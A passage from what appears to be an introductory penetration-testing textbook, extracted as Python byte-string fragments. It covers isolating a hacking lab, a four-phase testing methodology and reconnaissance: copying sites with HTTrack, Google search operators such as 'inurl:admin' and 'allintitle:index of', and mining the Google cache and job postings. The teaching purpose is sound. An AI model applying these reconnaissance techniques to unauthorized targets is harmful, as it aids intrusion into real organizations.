proper use and setup of a hacking lab is vital because one of the most \n', b'effective means to learn something is by doing that thing. learning and master-\n', b'ing the basics of penetration testing is no different.\n', b'the single most crucial point of any hacker lab is the isolation of the network. \n', b'You must configure your lab network in such a way that it is impossible for \n', b'traffic to escape or travel outside of the network. mistakes happen and even \n', b'the most careful people can fat-finger or mistype an iP address. it is a simple \n', b'mistake to mistype a single digit in an iP address, but that mistake can have \n', b'drastic consequences for you and your future. it would be a shame (and more \n', b'importantly illegal) for you to run a series of scans and attacks against what \n', b'you thought was your hacker lab target with an iP address of 172.16.1.1 only to \n', b'find out later that you actually entered the iP address as 122.16.1.1.\n', b'the simplest and most effective way to create a sandboxed or isolated environ-\n', b'ment is to physically unplug or disconnect your network from the internet. if \n', b'you are using physical machines, it is best to rely on hardwired ethernet cables \n', b'and switches to route traffic. Also be sure to double- and triple-check that all of \n', b'your wireless nics are turned off. Always carefully inspect and review your net-\n', b'work for potential leaks before continuing.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'10\n', b'Although the use of physical machines to create a hacking lab is an accept-\n', b'able solution, the use of virtual machines provides several key benefits. first, \n', b'given today\xe2\x80\x99s processing power, it is easy to set up and create a mini hacking \n', b'lab on a single machine or laptop. in most cases, an average machine can run \n', b'two or three virtual machines simultaneously because our targets can be set \n', b'up using minimal resources. even running on a laptop, it is possible to run \n', b'two virtual machines at the same time. the added benefit of using a laptop is \n', b'the fact that your lab is portable. with the cheap cost of external storage today, \n', b'it is easily possible to pack hundreds of virtual machines on a single external \n', b'hard drive; these can be easily transported and set up in a matter of minutes. \n', b'Anytime you are interested in practicing your skills or exploring a new tool, \n', b'simply open up Backtrack and deploy a Vm as a target. setting up a lab like this \n', b'gives you the ability to quickly plug-and-play with various operating systems \n', b'and configurations.\n', b'Another benefit of using virtual machines in your pen testing lab is the fact \n', b'that it is very simple to sandbox your entire system. simply turn off the wire-\n', b'less card and unplug the cable from the internet. Your physical machine and \n', b'virtual machines will still be able to communicate with each other and you can \n', b'be certain that no attack traffic will leave your physical machine.\n', b'in general, penetration testing is a destructive process. many of the tools and \n', b'exploits we run can cause damage or take systems offline. in some cases, it is \n', b'easier to reinstall the os or program rather than attempt to repair it. this is \n', b'another area where Vms shine. rather than having to physically reinstall a pro-\n', b'gram like sQl server or even an entire operating system, the Vm can be quickly \n', b'reset or restored to its original configuration.\n', b'phASES Of A pENETRATION TEST\n', b'like most things, the overall process of penetration testing can be broken \n', b'down into a series of steps or phases. when put together, these steps form a \n', b'comprehensive methodology for completing a penetration test. careful review \n', b'of unclassified incident response reports or breech disclosures supports the \n', b'idea that most black hat hackers also follow a process when attacking a target. \n', b'the use of an organized approach is important because it not only keeps the \n', b'penetration tester focused and moving forward but also allows the results or \n', b'output from each step to be used in the ensuing steps.\n', b'the use of a methodology allows you to break down a complex process into a \n', b'series of smaller more manageable tasks. Understanding and following a meth-\n', b'odology is an important step in mastering the basics of hacking. depending \n', b'on the literature or class you are taking, this methodology usually contains \n', b'between four and seven steps or phases. Although the overall names or num-\n', b'ber of steps can vary between methodologies, the important thing is that \n', b'the process provides a complete overview of the penetration testing process.  \n', b'\x0cWhat Is penetration Testing? ChApTER 1\n', b'11\n', b'for example, some methodologies use the term \xe2\x80\x9cinformation gathering,\xe2\x80\x9d \n', b'whereas others call the same process \xe2\x80\x9creconnaissance.\xe2\x80\x9d for the purpose of this \n', b'book, we will focus on the activities of the phase rather than the name. After \n', b'you have mastered the basics, you can review the various penetration testing \n', b'methodologies and choose one that you like best.\n', b'to keep things simple, we will use a four-step process to explore and learn \n', b'penetration testing. if you search around and examine other methodologies \n', b'(which is important to do), you may find processes that include more or less \n', b'steps than we are using as well as different names for each of the phases. it \n', b'is important to understand that although the specific terminology may differ, \n', b'most solid penetration testing methodologies cover the same topics.\n', b'there is one exception to this rule: the final step in many hacking methodolo-\n', b'gies is a phase called \xe2\x80\x9chiding,\xe2\x80\x9d \xe2\x80\x9ccovering your tracks,\xe2\x80\x9d or \xe2\x80\x9cremoving evidence.\xe2\x80\x9d \n', b'Because this book focuses on understanding the basics, it will not be included \n', b'in this methodology. once you have a solid understanding of the basics, you \n', b'can go on to explore and learn more about this phase.\n', b'the remainder of this book will be dedicated to reviewing and teaching the fol-\n', b'lowing steps: reconnaissance, scanning, exploitation, and maintaining Access. \n', b'sometimes, it helps to visualize these steps as an inverted triangle. figure 1.3 \n', b'demonstrates this approach. the reason we use an inverted triangle is because \n', b'the outcome of initial phases is very broad. As we move down into each phase, \n', b'we continue to drill down to very specific details.\n', b'the inverted triangle works well because it represents our journey from the \n', b'broad to the specific. for example, as we work through the reconnaissance \n', b'phase, it is important to cast our nets as wide as possible. every detail and every \n', b'piece of information about our target is collected and stored. the penetration \n', b'testing world is full of many great examples when a seemingly trivial piece of \n', b'Reconnaissance\n', b'Port Scanning\n', b'Vulnerability Scanning\n', b'Scanning\n', b'Exploitation\n', b'Maintaining Access\n', b'fIGURE 1.3\n', b'Zero Entry Hacking Penetration (ZEH) Testing Methodology.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'12\n', b'information was collected in the initial phase and later turned out to be a cru-\n', b'cial component for successfully completing an exploit and gaining access to \n', b'the system. in later phases, we begin to drill down and focus on more specific \n', b'details of the target. where is the target located? what is the iP address? what \n', b'operating system is the target running? what services and versions of software \n', b'are running on the system? As you can see, each of these questions becomes \n', b'increasingly more detailed and granular.\n', b'it is also important to understand the order of each step. the order in which \n', b'we conduct the steps is very important because the result or output of one step \n', b'needs to be used in the step below it. You need to understand more than just \n', b'how to simply run the security tools in this book. Understanding the proper \n', b'sequence in which they are run is vital to performing a comprehensive and \n', b'realistic penetration test.\n', b'for example, many newcomers skip the reconnaissance phase and go straight \n', b'to exploiting their target. not completing steps 1 and 2 will leave you with a \n', b'significantly smaller target list and attack vector on each target. in other words, \n', b'you become a one-trick-pony. Although knowing how to use a single tool \n', b'might be impressive to your friends and family, it is not to the security commu-\n', b'nity and professionals who take their job seriously.\n', b'it may also be helpful for newcomers to think of the steps we will cover as a \n', b'circle. it is very rare to find critical systems exposed directly to the internet in \n', b'today\xe2\x80\x99s world. in many cases, penetration testers must access and penetrate a \n', b'series of related targets before they have a path to reach the original target. in \n', b'these cases, each of the steps is often repeated. figure 1.4 introduces the meth-\n', b'odology as a cyclical process.\n', b'fIGURE 1.4\n', b'Cyclical Representation of the ZEH Methodology.\n', b'\x0cWhat Is penetration Testing? ChApTER 1\n', b'13\n', b'Zero Entry hacking: A four-Step Model\n', b'let us briefly review each of the four steps that will be covered so you have a \n', b'solid understanding of them. the first step in any penetration test is \xe2\x80\x9crecon-\n', b'naissance.\xe2\x80\x9d this phase deals with information gathering about the target. As \n', b'was mentioned previously, the more information you collect on your target, \n', b'the more likely you are to succeed in later steps. reconnaissance will be dis-\n', b'cussed in detail in chapter 2.\n', b'regardless of the information you had to begin with, after completing in-\n', b'depth reconnaissance you should have a list of target iP addresses that can be \n', b'scanned. the second step in our methodology can be broken out into two dis-\n', b'tinct activities. the first activity we conduct is port scanning. once we have fin-\n', b'ished with port scanning, we will have a list of open ports and potential service \n', b'running on each of the targets. the second activity in the scanning phase is vul-\n', b'nerability scanning. Vulnerability scanning is the process of locating and iden-\n', b'tifying specific weaknesses in the software and services of our targets.\n', b'with the results from step 2 in hand, we continue to the \xe2\x80\x9cexploitation\xe2\x80\x9d phase. \n', b'once we know exactly what ports are open, what services are running on those \n', b'ports, and what vulnerabilities are associated with those services, we can begin \n', b'to attack our target. this is the phase that most newcomers associate with \n', b'\xe2\x80\x9creal\xe2\x80\x9d hacking. exploitation can involve lots of different techniques, tools, and \n', b'code. we will review a few of the most common tools in chapter 4. the ulti-\n', b'mate goal of exploitation is to have administrative access (complete control) \n', b'over the target machine.\n', b'the final phase we will examine is \xe2\x80\x9cmaintaining access.\xe2\x80\x9d oftentimes, the \n', b'payloads delivered in the exploitation phase provide us with only tempo-\n', b'rary access to the system. Because most payloads are not persistent, we need \n', b'to create a more permanent backdoor to the system. this process allows our \n', b'administrative access to survive program closures and even reboots. As an ethi-\n', b'cal hacker, we must be very careful about the use and implementation of this \n', b'phase. we will discuss how to complete this step as well as the ethical implica-\n', b'tions of using backdoor or remote control software.\n', b'Although not included as a formal step in the penetration testing methodol-\n', b'ogy, the final (and arguably the most important) activity of every Pt is the \n', b'report. regardless of the amount of time and planning you put into conduct-\n', b'ing the penetration test, the client will often judge your work and effectiveness \n', b'on the basis of the quality of your report. the final Pt report should include all \n', b'the relevant information uncovered in your test and explain in detail how the \n', b'test was conducted and what was done during the test. whenever possible, mit-\n', b'igations and solutions should be presented for the security issues you uncov-\n', b'ered. finally, an executive summary should be included in every Pt report. the \n', b'purpose of this summary is to provide a simple one- to two-page, nontechni-\n', b'cal overview of your findings. this report should highlight and briefly sum-\n', b'marize the most critical issues your test uncovered. it is vital that this report \n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'14\n', b'be readable (and comprehendible) by both technical and nontechnical person-\n', b'nel. it is important not to fill the executive summary with too many technical \n', b'details; that is the purpose of the detailed report.\n', b'ChApTER REvIEW\n', b'this chapter introduced the concept of penetration testing and hacking as a \n', b'means of securing systems. it also discussed the various roles and charac-\n', b'ters that take part in the hacking scene. the chapter examined the basics of \n', b'Backtrack linux including how to boot up, login, start x, get an iP address, \n', b'and shutdown. we talked about how to set up your own isolated Pt lab so you \n', b'have a place to practice without fear of breaking the law and we wrapped up by \n', b'reviewing the steps of a penetration test.\n', b'it should be noted that there are several alternatives to Backtrack. At some \n', b'point, you may want to review and explore these other distributions. matriux \n', b'is similar to Backtrack but also includes a windows binary directory that can be \n', b'used and accessed directly from a windows machine. fedora security spin is a \n', b'collection of security-related tools built off of the fedora distribution. kAtAnA \n', b'is a multi-boot dVd that gathers a number of different tools and distributions \n', b'into a single location. finally, you may want to explore the classic std distri-\n', b'bution as well as Pentoo and Blackbuntu. there are many other linux pen-\n', b'etration testing distributions\xe2\x80\x94a simple google search for \xe2\x80\x9clinux Penetration \n', b'testing distributions\xe2\x80\x9d will provide you with a plethora of options. You could \n', b'also spend some time building and customizing your own linux distribution \n', b'by collecting and installing tools as your hacking career progresses.\n', b'SUMMARy\n', b'this chapter introduced the concept of penetration testing and ethical hack-\n', b'ing. A special \xe2\x80\x9cbasics only,\xe2\x80\x9d four-step methodology including reconnaissance, \n', b'scanning, exploitation, and maintaining Access was presented and explained. \n', b'information for setting up and using Backtrack linux including configuring \n', b'a network connection and issuing commands in a terminal window was pre-\n', b'sented. the use and creation of a penetration testing lab was outlined. this will \n', b'allow you to practice your skills in a safe and sandboxed environment. it will \n', b'also allow for completing and following along with the examples detailed in this \n', b'book.\n', b'\x0c15\n', b'Reconnaissance\n', b'ChApTER 2\n', b'Information in This Chapter:\n', b'n HTTrack: Website Copier\n', b'n Google Directives\xe2\x80\x94Practicing Your Google-Fu\n', b'n The Harvester: Discovering and Leveraging E-mail Addresses\n', b'n Whois\n', b'n Netcraft\n', b'n Host\n', b'n Extracting Information from DNS\n', b'n Extracting Information from E-mail Servers\n', b'n MetaGooFil\n', b'n Social Engineering\n', b'n Sifting through the Intel to Finding Attackable Targets\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'16\n', b'INTRODUCTION\n', b'in most cases people who attend hacking workshops or classes have a basic \n', b'understanding of a few security tools. typically, these students have used a \n', b'port scanner to examine a system or maybe they have used wireshark to exam-\n', b'ine network traffic. some have even played around with exploit tools like \n', b'metasploit. Unfortunately, most beginners do not understand how these tools \n', b'fit into the grand scheme of a penetration test. As a result, their knowledge is \n', b'incomplete. following a methodology ensures that you have a plan and know \n', b'what to do next.\n', b'to stress the importance of using and following a methodology, it is often ben-\n', b'eficial to describe a scenario that helps demonstrate both the importance of \n', b'this step and the value of following a complete methodology when conducting \n', b'a penetration test.\n', b'Assume you are an ethical penetration tester working for a security \n', b'company. Your boss walks over to your office and hands you a piece of \n', b'paper. \xe2\x80\x9cI just got off the phone with the CEO of that company. He wants \n', b'my best employee to Pen Test his company \xe2\x80\x93 that\xe2\x80\x99s you. Our Legal \n', b'Department will be sending you an email confirming we have all of the \n', b'proper authorizations and insurance\xe2\x80\x9d. You nod, accepting the job. He \n', b'leaves. You flip over the paper, a single word is written on the paper, \n', b'\xe2\x80\x9cSyngress.\xe2\x80\x9d It\xe2\x80\x99s a company you\xe2\x80\x99ve never heard of before, and no other \n', b'information is written on the paper.\n', b'What now?\n', b'the first step in every job is research. the more thoroughly you prepare for a \n', b'task, the more likely you are to succeed. the guys who created Backtrack linux \n', b'are fond of quoting Abraham lincoln who said, \xe2\x80\x9cif i had six hours to chop \n', b'down a tree, i\xe2\x80\x99d spend the first four of them sharpening my axe.\xe2\x80\x9d this is a per-\n', b'fect introduction to both penetration testing and the reconnaissance phase.\n', b'Reconnaissance, also known as information gathering, is arguably the most \n', b'important of the four phases we will discuss. the more time you spend col-\n', b'lecting information on your target, the more likely you are to be successful in \n', b'the later phases. ironically, recon is also one of the most overlooked, underuti-\n', b'lized, and misunderstood steps in Pt methodologies today.\n', b'it is possible that this phase is overlooked because newcomers are never for-\n', b'mally introduced to the concept, its rewards, or how the results of good infor-\n', b'mation gathering can be vital in later steps. it is also possible that this phase is \n', b'overlooked because it is the least \xe2\x80\x9ctechnical.\xe2\x80\x9d oftentimes, people who are new \n', b'to hacking tend to view this phase as boring and unchallenging. nothing could \n', b'be further from the truth.\n', b'Although it is true that there are very few good, automated tools that can be \n', b'used to complete recon, once you understand the basics it is like an entirely \n', b'new way of looking at the world. A good information gatherer is made up of \n', b'equal parts: hacker, social engineer, and private investigator. Aside from the lack \n', b'Openmirrors.com\n', b'\x0cReconnaissance ChApTER 2\n', b'17\n', b'of tools, the absence of well-defined rules of engagement also distinguishes this \n', b'phase from all others. this is in stark contrast to the remaining steps in our \n', b'methodology. for example, when we discuss scanning in chapter 3, there is a \n', b'specific order and a clear series of steps that need to be followed in order to \n', b'properly port scan a target.\n', b'learning how to conduct digital reconnaissance is a valuable skill for anyone \n', b'living in today\xe2\x80\x99s world. for penetration testers and hackers, it is invaluable. \n', b'the penetration testing world is filled with great examples and stories of how \n', b'good recon single-handedly allowed the tester to fully compromise a network \n', b'or system.\n', b'consider the following example: assume we have two different criminals who \n', b'are planning to rob a bank. the first criminal buys a gun and runs into the \n', b'first bank he finds yelling \xe2\x80\x9cHAnds UP! giVe me All YoUr moneY!\xe2\x80\x9d it is \n', b'not hard to imagine that the scene would be complete chaos and even if the \n', b'bungling burglar managed to get away, it probably would not take long for the \n', b'police to find him, arrest him, and send him to prison. contrast this to nearly \n', b'every Hollywood movie in existence today where criminals spend months \n', b'planning, scheming, organizing, and reviewing details before the heist. they \n', b'spend time getting weapons anonymously, planning escape routes, and review-\n', b'ing schematics of the building. they visit the bank to determine the position of \n', b'the security cameras, make note of the guards, and determine when the bank \n', b'has the most money or is the most vulnerable. clearly, the second criminal has \n', b'the better chance of getting away with the money.\n', b'it should be obvious that the difference between these two examples is prepa-\n', b'ration and homework. Hacking and penetration testing is the same\xe2\x80\x94you can-\n', b'not just get an iP address and start running metasploit (well you can, but you \n', b'are probably not going to be very effective).\n', b'recall the example used to begin this chapter. You had been assigned to \n', b'complete a penetration test but were given very little information to go on. \n', b'As a matter of fact, you were given only the company name, one word. the \n', b'million-dollar question for every aspiring hacker is, \xe2\x80\x9cHow do i go from a single \n', b'company name to owning the systems inside the network?\xe2\x80\x9d when we begin, \n', b'we know virtually nothing about the organization; we do not know their web-\n', b'site, physical address, or number of employees. we do not know their public \n', b'iP addresses or internal iP schemes; we know nothing about the technology \n', b'deployed, operating systems used, or defenses.\n', b'step 1 begins by conducting a thorough search of public information. the great \n', b'thing about this phase is that in most cases, we can gather a significant amount \n', b'of data without ever sending a single packet to the target. Although it should \n', b'be pointed out that some tools or techniques used in reconnaissance do in fact \n', b'send information directly to the target, it is important to know the difference \n', b'between which tools do and which tools do not touch the target. there are two \n', b'main goals in this phase: first, we need to gather as much information as pos-\n', b'sible about the target; second, we need to sort through all the information gath-\n', b'ered and create a list of attackable iP addresses.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'18\n', b'in chapter 1, it was pointed out that a major difference between black hat and \n', b'white hat attackers is authorization. step 1 provides us with a prime example of \n', b'this. Both types of hackers conduct exhaustive reconnaissance on their targets. \n', b'Unfortunately, malicious hackers are bound by neither scope nor authorization.\n', b'when ethical hackers conduct research, they are required to stay within \n', b'the confines of the test. during the information gathering process, it is not \n', b'unheard-of for a hacker to uncover a vulnerable system that is related to the tar-\n', b'get but not owned by the target. even if the related target could provide access \n', b'into the original organization, without prior authorization, a white hat hacker \n', b'is not allowed to use or explore this option. for example, let us assume that \n', b'you are doing a penetration test against a company and you determine that \n', b'their web server (which contains customer records) is outsourced or managed \n', b'by a third party. if you find a serious vulnerability on the customer\xe2\x80\x99s website, \n', b'but you have not been explicitly authorized to test and use the website, you \n', b'must ignore it. the black hat attackers are bound by no such rules and will use \n', b'any means possible to access the target systems. in most cases, because you \n', b'were not authorized to test and examine these outside systems, you will not be \n', b'able to provide a lot of detail; however, your final report must include as much \n', b'information as possible about any systems that you believe put the organiza-\n', b'tion at risk.\n', b'to be successful at reconnaissance, you must have a strategy. nearly all facets \n', b'of information gathering leverage the power of the internet. A typical strategy \n', b'needs to include both active and passive reconnaissance.\n', b'Active reconnaissance includes interacting directly with the target. it is important \n', b'to note that during this process, the target may record our iP address and log \n', b'our activity.\n', b'Passive reconnaissance makes use of the vast amount of information available \n', b'on the web. when we are conducting passive reconnaissance, we are not inter-\n', b'acting directly with the target and as such, the target has no way of knowing, \n', b'recording, or logging our activity.\n', b'As mentioned, the goal of reconnaissance is to collect as much information as \n', b'possible on your target. At this point in the penetration test, no detail should \n', b'be overlooked regardless of how innocuous it may seem. while you are gath-\n', b'ering information, it is important to keep your data in a central location. \n', b'whenever possible, it is helpful to keep the information in electronic format. \n', b'this allows for quick and accurate searches later on. every hacker is a bit dif-\n', b'ferent and there are still several hackers who prefer to print out all the infor-\n', b'mation they gather. each piece of paper is carefully cataloged and stored in a \n', b'folder. if you are going to use the traditional paper method, be sure to carefully \n', b'organize your records. Paper-based information gathering binders on a single \n', b'target can quickly grow to several hundred pages.\n', b'in most cases, the first activity is to locate the target\xe2\x80\x99s website. in our example, \n', b'we would use a search engine to look for \xe2\x80\x9csyngress.\xe2\x80\x9d\n', b'\x0cReconnaissance ChApTER 2\n', b'19\n', b'hTTrack: WEBSITE COpIER\n', b'typically, we begin step 1 by closely reviewing the target\xe2\x80\x99s website. in some \n', b'cases, we may actually use a tool called Httrack to make a page-by-page copy \n', b'of the website. Httrack is a free utility that creates an identical, off-line copy \n', b'of the target website. the copied website will include all the pages, links, pic-\n', b'tures, and code from the original website; however, it will reside on your local \n', b'fIGURE 2.1\n', b'Accessing the Newly Installed HTTrack.\n', b'ADDITIONAL RESOURCES\n', b'It is important to understand that the more time you spend navigating and exploring \n', b'the target website, the more likely it is that your activity can be tracked or traced  \n', b'(even if you are simply browsing the site). Remember anytime you interact directly  \n', b'with a resource owned by the target, there is a chance you will leave a digital \n', b'fingerprint behind.\n', b'Advanced penetration testers can also run automated tools to extract additional or \n', b'hidden information from a local copy of a website.\n', b'HTTrack can be downloaded directly from the company\xe2\x80\x99s website at: http://www.\n', b'httrack.com/. Installing for Windows is as simple as downloading the installer .exe \n', b'and clicking next. If you want to install HTTrack in Backtrack, you can connect to the \n', b'Internet as we described in Chapter 1, open a terminal, and type:\n', b'apt-get install webhttrack\n', b'Once the program is installed in, you can find it by clicking: Kstart \xe2\x86\x92 Internet \xe2\x86\x92 \n', b'WebHTTrack Website Copier, as shown in Figure 2.1.\n', b'The \xe2\x80\x9cKstart\xe2\x80\x9d is the small dragon icon in the lower left of the screen. This provides you \n', b'access to many of the tools included with Backtrack. The Kstart button is similar to \n', b'the Windows or Start button found in many Microsoft operating systems.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'20\n', b'computer. Utilizing a website copying tool like Httrack allows us to explore \n', b'and thoroughly mine the website \xe2\x80\x9coff-line\xe2\x80\x9d without having to spend additional \n', b'time traipsing around on the company\xe2\x80\x99s web server.\n', b'After we have installed the program, we need to run it against our target. Please \n', b'be aware that this activity is easy to trace and considered highly offensive. never \n', b'run this tool without prior authorization. once Httrack is started, we are pre-\n', b'sented with a number of web pages that allow us to set up and customize the \n', b'copy process. each page allows us to change various aspects of the program \n', b'including language (english is default), project name, the location where we \n', b'will store the copied website, and the web address of the site you would like \n', b'to copy. You can work your way through each of these pages by making the \n', b'desired changes to each option and clicking the \xe2\x80\x9cnext\xe2\x80\x9d button. the final page \n', b'will include a \xe2\x80\x9cstart\xe2\x80\x9d button, click this when you are ready to begin making a \n', b'copy of your target\xe2\x80\x99s website. the amount of time it takes for this process to \n', b'complete will depend on the size of your target\xe2\x80\x99s website. once Httrack has \n', b'finished copying the target website, it will present you with a webpage allow-\n', b'ing you to \xe2\x80\x9cBrowse the mirrored website\xe2\x80\x9d in a browser or navigate to the path \n', b'where the site was stored.\n', b'whether you make a copy of the target website or you simply browse the tar-\n', b'get in real time, it is important to pay attention to details. You should begin \n', b'by closely reviewing and recording all the information you find on the target\xe2\x80\x99s \n', b'website. oftentimes, with very little digging you will be able to make some sig-\n', b'nificant findings including physical address and locations, phone numbers, \n', b'e-mail addresses, hours of operation, business relationships (partnerships), \n', b'employee names, social media connections, and other public tidbits.\n', b'oftentimes when conducting a penetration test, it is important to pay spe-\n', b'cial attention to things like \xe2\x80\x9cnews\xe2\x80\x9d or \xe2\x80\x9cAnnouncements.\xe2\x80\x9d companies are \n', b'often proud of their achievements and unintentionally leak useful informa-\n', b'tion through these stories. company mergers and acquisitions can also yield \n', b'valuable data; this is especially important for expanding the scope and adding \n', b'additional targets to our penetration test. even the smoothest of acquisitions \n', b'creates change and disarray in an organization. there is always a transition \n', b'period when companies merge. this transition period provides us with unique \n', b'opportunities to take advantage of the change and confusion. even if merger \n', b'is old news or goes off without a hitch, the information still provides value by \n', b'giving us additional targets. merged or sibling companies should be authorized \n', b'and included in the original target list, as they provide a potential gateway into \n', b'the organization.\n', b'finally, it is important to search and review any open job postings for the tar-\n', b'get company. Job postings often reveal very detailed information about the \n', b'technology being used by an organization. many times you will find specific \n', b'hardware and software listed on the job opening. do not forget to search for \n', b'your target in the nationwide job banks as well. for example, assume you \n', b'come across a job requisition looking for a network Administrator with cisco \n', b'Openmirrors.com\n', b'\x0cReconnaissance ChApTER 2\n', b'21\n', b'AsA experience. from this post, you can draw some immediate conclusions \n', b'and make some educated guesses. first, you can be certain that the company \n', b'either uses, or is about to use, a cisco AsA firewall. second, depending on the \n', b'size of the organization, you may be able to infer that the company does not \n', b'have, or is about to lose, someone with knowledge of how to properly use and \n', b'configure a cisco AsA firewall. in either case, you have gained valuable knowl-\n', b'edge about the technology in place.\n', b'in most cases, once we have thoroughly examined the target\xe2\x80\x99s website, we \n', b'should have a solid understanding of the target including who they are, what \n', b'they do, and where they are located.\n', b'Armed with this basic information about the target, we move into passive \n', b'reconnaissance. it is very difficult, if not impossible, for a company to deter-\n', b'mine when a hacker or penetration tester is conducting passive reconnaissance. \n', b'this activity offers a low-risk, high-reward situation for attackers. recall that \n', b'passive reconnaissance is conducted without ever sending a single packet to \n', b'the target systems. our weapon of choice to perform this task is the internet. \n', b'we begin by performing exhaustive searches of our target in the various search \n', b'engines available.\n', b'Although there are many great search engines available today, when covering \n', b'the basics of hacking and penetration testing, we will focus on google. google \n', b'is very, very good at its job. there is a reason why the company\xe2\x80\x99s stock trades \n', b'for $400\xee\x80\xb2$600 a share. spiders from the company aggressively and repeatedly \n', b'scour all corners of the internet cataloging information and send it back to the \n', b'google. the company is so efficient at its job, that oftentimes hackers can per-\n', b'form an entire penetration test using nothing but google.\n', b'At defcon 13 Johnny long rocked the hacker community by giving a talk titled \n', b'\xe2\x80\x9cgoogle Hacking for Penetration testers.\xe2\x80\x9d this talk was followed up by a book \n', b'that dove even deeper into the art of google Hacking.\n', b'Although we would not dive into the specifics of google Hacking, a solid \n', b'understanding of how to properly use google is vital to becoming a skilled \n', b'penetration tester. if you ask people, \xe2\x80\x9cHow do you use google?\xe2\x80\x9d they typically \n', b'respond by saying, \xe2\x80\x9cwell it\xe2\x80\x99s simple\xe2\x80\xa6You fire up a web browser, navigate to \n', b'google, and type what you\xe2\x80\x99re searching for in the box.\xe2\x80\x9d\n', b'ADDITIONAL RESOURCES\n', b'If you are interested in penetration testing, it is highly suggested that you watch the \n', b'video and buy the book. You can see the video for free online (check the Defcon \n', b'media archive), and the book is published by Syngress and available nearly anywhere. \n', b'Johnny\xe2\x80\x99s discoveries have changed penetration testing and security forever. Johnny\xe2\x80\x99s \n', b'material is awesome and well worth your time.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'22\n', b'Although this answer is fine for 99 percent of the planet, it is not good enough \n', b'for aspiring hackers. You have to learn to search in a smarter way and maxi-\n', b'mize the return results. in short, you must cultivate your google-fu. learning \n', b'how to properly use a search engine like google will save you time and allow \n', b'you to find the hidden gems that are buried in the trillions of web pages on the \n', b'internet today.\n', b'GOOGLE DIRECTIvES\xe2\x80\x94pRACTICING yOUR  \n', b'GOOGLE-fU\n', b'luckily for us, google provides \xe2\x80\x9cdirectives\xe2\x80\x9d that are easy to use and help us get \n', b'the most out of every search. these directives are keywords that enable us to \n', b'more accurately extract information from the google index.\n', b'consider the following example: assume you are looking for information on \n', b'the dakota state University website (dsu.edu) about me. the simplest way to \n', b'perform this search is to enter the following terms (without the quotes) in a \n', b'google search box: \xe2\x80\x9cpat engebretson dsu.\xe2\x80\x9d this search will yield a fair number \n', b'of hits. However of the first 50 websites returned, only four were pulled directly \n', b'from the dsU website.\n', b'By utilizing google directives, we can force the google index to do our bid-\n', b'ding. in the example above we know both the target website and the keywords \n', b'we want to search. more specifically, we are interested in forcing google to \n', b'return only results that are pulled directly from the target (dsu.edu) domain. in \n', b'this case, our best choice is to utilize the \xe2\x80\x9csite:\xe2\x80\x9d directive. Using the \xe2\x80\x9csite:\xe2\x80\x9d direc-\n', b'tive forces google to return only hits that contain the keywords we used and \n', b'come directly from the specified website.\n', b'to properly use a google directive, you need three things:\n', b'1. the name of the directive you want to use\n', b'2. A colon\n', b'3. the term you want to use in the directive\n', b'After you have entered the three pieces of information above, you can search \n', b'as you normally would. to utilize the \xe2\x80\x9csite:\xe2\x80\x9d directive, we need to enter the fol-\n', b'lowing into a google search box:\n', b'site:domain term(s) to search\n', b'note that there is no space between the directive, colon, and domain. in our \n', b'earlier example we wanted to conduct a search for Pat engebretson on the dsU \n', b'website. to accomplish this, we would enter the following command into the \n', b'google search bar:\n', b'site:dsu.edu pat engebretson\n', b'running this search provides us with drastically different results than our ini-\n', b'tial attempt. first, we have trimmed the overall number of hits from 600\xee\x80\xb1  \n', b'\x0cReconnaissance ChApTER 2\n', b'23\n', b'to about 50. there is little doubt that a person can sort through and gather \n', b'information from 50 hits much quicker than 600. second and possibly more \n', b'importantly, every single returned result comes directly from the target website. \n', b'Utilizing the \xe2\x80\x9csite:\xe2\x80\x9d directive is a great way to search a specific target and look \n', b'for additional information. this directive allows you to avoid search overload \n', b'and to focus your search.\n', b'Another good google directive to use is \xe2\x80\x9cintitle:\xe2\x80\x9d or \xe2\x80\x9callintitle:\xe2\x80\x9d. Adding either \n', b'of these to your search causes only websites that have your search words in the \n', b'title of the webpage to be returned. the difference between \xe2\x80\x9cintitle:\xe2\x80\x9d and \xe2\x80\x9callin-\n', b'title:\xe2\x80\x9d is straightforward. \xe2\x80\x9callintitle:\xe2\x80\x9d will only return websites that contain all \n', b'the keywords in the web page title. the \xe2\x80\x9cintitle:\xe2\x80\x9d directive will return any page \n', b'whose title contains at least one of the keywords you entered.\n', b'A classic example of putting the \xe2\x80\x9callintitle:\xe2\x80\x9d google hack to work is to perform \n', b'the following search:\n', b'allintitle:index of\n', b'Performing this search will allow us to view a list of any directories that have \n', b'been indexed and are available via the web server. this is often a great place to \n', b'gather reconnaissance on your target.\n', b'if we want to search for sites that contain specific words in the Url, we can \n', b'use the \xe2\x80\x9cinurl:\xe2\x80\x9d directive. for example, we can issue the following command to \n', b'locate potentially interesting pages on our target\xe2\x80\x99s web page:\n', b'inurl:admin\n', b'this search can be extremely useful in revealing administrative or configuration \n', b'pages on your target\xe2\x80\x99s website.\n', b'it can also be very valuable to search the google cache rather than the target\xe2\x80\x99s \n', b'website. this process not only reduces your digital footprints on the target\xe2\x80\x99s \n', b'server, making it harder to catch you, it also provides a hacker with the occa-\n', b'sional opportunity to view web pages and files that have been removed from \n', b'the original website. the google cache contains a stripped-down copy of each \n', b'website that the google bots have spidered. it is important to understand that \n', b'the cache contains both the code used to build the site and many of the files \n', b'that were discovered during the spidering process. these files can be Pdfs, ms \n', b'office documents like word and excel, text files, and more.\n', b'it is not uncommon today for information to be placed on the internet \n', b'by mistake. consider the following example. suppose you are a network \n', b'ALERT!\n', b'It is worth noting that all searches in Google are case insensitive so \xe2\x80\x9cpat,\xe2\x80\x9d \xe2\x80\x9cPat,\xe2\x80\x9d and \n', b'\xe2\x80\x9cPAT\xe2\x80\x9d will all return the same results!\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'24\n', b'administrator for a company. You use ms excel to create a simple workbook \n', b'containing all the iP addresses, computer names, and locations of the Pcs in \n', b'your network. rather than carrying this excel spreadsheet around, you decide \n', b'to publish it to the intranet where it will be accessible only by people within \n', b'your organization. However, rather than publishing this document to the \n', b'intranet website, you mistakenly publish it to the company internet website. \n', b'if the google bots spider your site before you take this file down, it is possible \n', b'the document will live on in the google cache even after you have removed it \n', b'from your site. As a result, it is important to search the google cache too.\n', b'we can use the cache: directive to limit our search results and show only infor-\n', b'mation pulled directly from the 